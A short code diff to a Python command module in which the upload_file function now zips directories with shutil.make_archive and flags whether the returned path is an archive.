@@ -1,3 +1,4 @@
+import shutil
 import subprocess
 import os
 import requests
@@ -75,8 +76,17 @@ class Download(ICommandModule):
     def upload_file(args: UploadFileArgs) -> CommandResult:
         if not os.path.exists(args.file_path):
             return CommandResult(result="Error: File does not exist.", success=False)
+        
+        if os.path.isdir(args.file_path):
+            zip_path = args.file_path + '.zip'
+            try:
+                shutil.make_archive(args.file_path, 'zip', args.file_path)
+                return CommandResult(result={"path": zip_path, "zip" : True}, success=True)
+            except Exception as e:
+                return CommandResult(result=f"Error: {e}", success=False)
+        
         try:
-            return CommandResult(result={"path": args.file_path}, success=True)
+            return CommandResult(result={"path": args.file_path, "zip" : False}, success=True)
         except Exception as e:
             return CommandResult(result=f"Error: {e}", success=False)
 
